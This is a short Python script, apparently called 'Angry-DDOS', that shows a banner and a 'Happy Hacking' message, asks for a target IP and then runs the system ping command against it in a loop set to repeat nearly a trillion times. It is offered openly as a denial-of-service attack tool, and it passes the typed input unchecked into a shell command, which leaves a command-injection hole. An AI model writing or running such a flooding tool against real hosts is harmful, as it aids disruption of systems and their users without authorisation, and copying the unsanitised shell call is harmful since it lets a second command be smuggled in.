from itertools import count
import os


print (''' 

      .o.                                                           oooooooooo.   oooooooooo.     .oooooo.    .oooooo..o 
     .888.                                                          `888'   `Y8b  `888'   `Y8b   d8P'  `Y8b  d8P'    `Y8 
    .8"888.     ooo. .oo.    .oooooooo oooo d8b oooo    ooo          888      888  888      888 888      888 Y88bo.      
   .8' `888.    `888P"Y88b  888' `88b  `888""8P  `88.  .8'           888      888  888      888 888      888  `"Y8888o.  
  .88ooo8888.    888   888  888   888   888       `88..8'   8888888  888      888  888      888 888      888      `"Y88b 
 .8'     `888.   888   888  `88bod8P'   888        `888'             888     d88'  888     d88' `88b    d88' oo     .d8P 
o88o     o8888o o888o o888o `8oooooo.  d888b        .8'             o888bood8P'   o888bood8P'    `Y8bood8P'  8""88888P'  
                            d"     YD           .o..P'                                                                   
                            "Y88888P'           `Y8P'                                                                    
                                                                                                                         
    ''')


print ('''

    | ---------
    |   + Application Developer : cioz
    | ---------
    | +++ Note : You Can Stop The Attack By Press : CTRL + Z
    | ---------
    | +++ Happy Hacking ! +++
    | ---------

    ''')


host = input('Please Enter The Target IP : ')

counter = 0

goal = 987654321369

while counter <= goal:
    print("---------")
    send_ping = os.system("ping " + host)
    counter += 1
    print(send_ping)


